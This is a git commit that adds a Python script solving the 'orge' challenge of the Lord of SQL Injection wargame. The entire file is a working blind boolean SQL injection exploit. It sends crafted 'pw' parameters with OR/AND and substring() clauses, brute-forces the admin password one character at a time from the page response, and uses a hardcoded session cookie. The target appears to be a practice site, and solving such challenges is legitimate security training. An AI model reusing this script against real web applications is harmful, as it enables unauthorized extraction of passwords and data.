dae5ff8efbf0bd1c3e3bcc2a41a247bcc7c95801
Spycio.Kon <77606941+tiyeume25112004@users.noreply.github.com>
2022-12-21 21:33:01 +0700

    Create LORD_OF_SQLINJECTION_ORGE.py

---
+++ LORD_OF_SQLINJECTION_ORGE.py
@@ -0,0 +1,27 @@
+import requests
+import time
+
+URL="https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
+
+params = {'pw':''}
+
+cookie={
+    "PHPSESSID":"m6svmk60lvo3rlrb93bftic7cv"
+    }
+
+password = ''
+start = time.time()
+for i in range(8):
+    print(i, end=' ')
+    for j in range(32, 127):
+        params['pw'] = "'||id='admin'&&substring(pw,{},1)='{}'-- ".format(i+1, chr(j))
+        res = requests.get(URL, params=params, cookies=cookie)
+        #print(i, j, res.text)
+        if "Hello admin" in res.text:
+            print("found!:{} : {}".format(i, chr(j)))
+            password += chr(j)
+            break
+
+print(password)
+end = time.time()
+print(end - start)
